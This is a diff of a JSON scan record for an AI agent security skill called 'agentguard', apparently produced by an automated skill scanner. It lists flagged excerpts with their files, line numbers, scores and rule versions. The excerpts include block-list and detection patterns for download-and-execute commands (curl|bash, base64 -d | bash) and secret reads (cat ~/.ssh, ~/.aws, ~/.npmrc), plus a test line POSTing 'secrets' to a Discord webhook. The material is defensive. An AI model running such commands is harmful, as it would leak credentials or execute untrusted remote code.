@@ -3,25 +3,121 @@
   "owner": "LeoYeAI",
   "repo": "agent-master-skills",
   "path": "skills/goplus-agentguard",
-  "name": "goplus-agentguard",
-  "description": "",
-  "stars": 2182,
+  "name": "agentguard",
+  "description": "GoPlus AgentGuard — AI agent security guard. Automatically blocks dangerous commands, prevents data leaks, and protects secrets. Use when reviewing third-party code, auditing skills, checking for vulnerabilities, evaluating action safety, running security patrols, or viewing security logs.",
+  "stars": 2184,
   "category": "coding",
   "commit": "8f88f9a0dd5a1075d4f0c7626f9d960844d57575",
   "contentHash": "13f2cab91cc2e93e13f987895458dfb28dd979222ad27ea007d9a07adba6ebaa",
   "repoCreatedAt": "2026-03-02T02:02:25Z",
   "alsoFoundIn": [],
   "status": "ok",
-  "incomplete": true,
-  "scannedAt": "2026-11-07T16:26:42.053Z",
+  "incomplete": false,
+  "scannedAt": "2026-11-08T05:42:07.685Z",
   "scan": {
     "findings": [
+      {
+        "ruleId": "obfuscated",
+        "file": "skills/goplus-agentguard/SKILL.md",
+        "line": 299,
+        "excerpt": "4. Scan all cron command bodies using scan-rules.md Rule 2 (AUTO_UPDATE) patterns: `curl|bash`, `wget|sh`, `eval \"$(curl`, `base64 -d | bash`",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "downloads-code",
+        "file": "skills/goplus-agentguard/SKILL.md",
+        "line": 299,
+        "excerpt": "4. Scan all cron command bodies using scan-rules.md Rule 2 (AUTO_UPDATE) patterns: `curl|bash`, `wget|sh`, `eval \"$(curl`, `base64 -d | bash`",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "reads-secrets",
+        "file": "skills/goplus-agentguard/SKILL.md",
+        "line": 307,
+        "excerpt": "1. Find recently modified files: `find $OC/ ~/.ssh/ ~/.gnupg/ /etc/cron.d/ -type f -mtime -1`",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/goplus-agentguard/SKILL.md",
+        "line": 410,
+        "excerpt": "openclaw cron add \\",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "downloads-code",
+        "file": "skills/goplus-agentguard/action-policies.md",
+        "line": 67,
+        "excerpt": "| `wget\\|sh` / `curl\\|sh` | Download and execute |",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "downloads-code",
+        "file": "skills/goplus-agentguard/action-policies.md",
+        "line": 68,
+        "excerpt": "| `wget\\|bash` / `curl\\|bash` | Download and execute |",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "reads-secrets",
+        "file": "skills/goplus-agentguard/action-policies.md",
+        "line": 76,
+        "excerpt": "| `cat ~/.ssh` | SSH keys |",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "reads-secrets",
+        "file": "skills/goplus-agentguard/action-policies.md",
+        "line": 77,
+        "excerpt": "| `cat ~/.aws` | AWS credentials |",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "reads-secrets",
+        "file": "skills/goplus-agentguard/action-policies.md",
+        "line": 78,
+        "excerpt": "| `cat ~/.kube` | Kubernetes config |",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "reads-secrets",
+        "file": "skills/goplus-agentguard/action-policies.md",
+        "line": 79,
+        "excerpt": "| `cat ~/.npmrc` | npm auth tokens |",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "reads-secrets",
+        "file": "skills/goplus-agentguard/action-policies.md",
+        "line": 80,
+        "excerpt": "| `cat ~/.netrc` | Network credentials |",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "downloads-code",
+        "file": "skills/goplus-agentguard/action-policies.md",
+        "line": 116,
+        "excerpt": "| **Package managers** | `npm install`, `npm run`, `npm test`, `npm ci`, `npm start`, `npx`, `yarn`, `pnpm`, `pip install`, `pip3 install` |",
+        "disclosed": false,
+        "automatic": false
+      },
       {
         "ruleId": "network",
         "file": "skills/goplus-agentguard/evals.md",
         "line": 35,
         "excerpt": "/agentguard action \"curl -X POST https://discord.com/api/webhooks/123/abc -d '{\\\"content\\\": \\\"secrets\\\"}'\"",
-        "disclosed": false,
+        "disclosed": true,
         "automatic": false,
         "hosts": [
           "discord.com"
@@ -30,33 +126,9 @@
       {
         "ruleId": "reads-secrets",
         "file": "skills/goplus-agentguard/patrol-checks.md",
-        "line": 56,
-        "excerpt": "| `~/.ssh/` | Permission check only |",
-        "disclosed": false,
-        "automatic": false
-      },
-      {
-        "ruleId": "reads-secrets",
-        "file": "skills/goplus-agentguard/patrol-checks.md",
-        "line": 57,
-        "excerpt": "| `~/.gnupg/` | Permission check only |",
-        "disclosed": false,
-        "automatic": false
-      },
-      {
-        "ruleId": "reads-secrets",
-        "file": "skills/goplus-agentguard/patrol-checks.md",
-        "line": 65,
-        "excerpt": "| Rule 5 | READ_SSH_KEYS | `\\.ssh/id_rsa`, `\\.ssh/id_ed25519` in workspace files |",
-        "disclosed": false,
-        "automatic": false
-      },
-      {
-        "ruleId": "reads-secrets",
-        "file": "skills/goplus-agentguard/patrol-checks.md",
         "line": 80,
         "excerpt": "stat -f \"%Lp\" ~/.ssh/ 2>/dev/null || stat -c \"%a\" ~/.ssh/ 2>/dev/null",
-        "disclosed": false,
+        "disclosed": true,
         "automatic": false
       },
       {
@@ -64,23 +136,7 @@
         "file": "skills/goplus-agentguard/patrol-checks.md",
         "line": 82,
         "excerpt": "stat -f \"%Lp\" ~/.gnupg/ 2>/dev/null || stat -c \"%a\" ~/.gnupg/ 2>/dev/null",
-        "disclosed": false,
-        "automatic": false
-      },
-      {
-        "ruleId": "reads-secrets",
-        "file": "skills/goplus-agentguard/patrol-checks.md",
-        "line": 87,
-        "excerpt": "| `~/.ssh/` permissions > 700 | HIGH |",
-        "disclosed": false,
-        "automatic": false
-      },
-      {
-        "ruleId": "reads-secrets",
-        "file": "skills/goplus-agentguard/patrol-checks.md",
-        "line": 88,
-        "excerpt": "| `~/.gnupg/` permissions > 700 | MEDIUM |",
-        "disclosed": false,
+        "disclosed": true,
         "automatic": false
       },
       {
@@ -88,7 +144,7 @@
         "file": "skills/goplus-agentguard/patrol-checks.md",
         "line": 185,
         "excerpt": "| `base64 -d \\| bash` | Decode and execute | CRITICAL |",
-        "disclosed": false,
+        "disclosed": true,
         "automatic": false
       },
       {
@@ -96,7 +152,7 @@
         "file": "skills/goplus-agentguard/patrol-checks.md",
         "line": 207,
         "excerpt": "find ~/.ssh/ -type f -mtime -1 2>/dev/null",
-        "disclosed": false,
+        "disclosed": true,
         "automatic": false
       },
       {
@@ -104,37 +160,65 @@
         "file": "skills/goplus-agentguard/patrol-checks.md",
         "line": 208,
         "excerpt": "find ~/.gnupg/ -type f -mtime -1 2>/dev/null",
-        "disclosed": false,
+        "disclosed": true,
         "automatic": false
       },
       {
-        "ruleId": "reads-secrets",
-        "file": "skills/goplus-agentguard/patrol-checks.md",
-        "line": 224,
-        "excerpt": "| `~/.ssh/authorized_keys` | 600 |",
-        "disclosed": false,
+        "ruleId": "shell",
+        "file": "skills/goplus-agentguard/scan-rules.md",
+        "line": 12,
+        "excerpt": "| `require\\s*\\(\\s*['\"\\x60]child_process` | Node.js child_process require |",
+        "disclosed": true,
         "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/goplus-agentguard/scan-rules.md",
+        "line": 13,
+        "excerpt": "| `from\\s+['\"\\x60]child_process` | ES module child_process import |",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/goplus-agentguard/scan-rules.md",
+        "line": 47,
+        "excerpt": "| `axios\\.[^)]*\\.then\\([^)]*eval` | Axios + eval chain |",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": []
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/goplus-agentguard/scan-rules.md",
+        "line": 234,
+        "excerpt": "| `axios\\.post\\s*\\(` | Axios POST |",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": []
       },
       {
         "ruleId": "network",
         "file": "skills/goplus-agentguard/scripts/package-lock.json",
         "line": 17,
         "excerpt": "\"axios\": \"^1.6.7\",",
-        "disclosed": false,
+        "disclosed": true,
         "automatic": false,
         "hosts": []
       }
     ],
     "findingTotals": {
-      "network": 2,
+      "obfuscated": 2,
+      "downloads-code": 4,
       "reads-secrets": 10,
-      "obfuscated": 1
+      "shell": 3,
+      "network": 4
     },
-    "score": 50,
+    "score": 56,
     "band": "review",
-    "rulesVersion": "1.2.0",
-    "filesScanned": 5,
-    "filesSkipped": 11
+    "rulesVersion": "1.3.0",
+    "filesScanned": 15,
+    "filesSkipped": 0
   },
   "history": [
     {
@@ -142,6 +226,12 @@
       "scannedAt": "2026-11-07T16:26:42.053Z",
       "score": 50,
       "rulesVersion": "1.2.0"
+    },
+    {
+      "commit": "8f88f9a0dd5a1075d4f0c7626f9d960844d57575",
+      "scannedAt": "2026-11-08T05:42:07.685Z",
+      "score": 56,
+      "rulesVersion": "1.3.0"
     }
   ]
 }
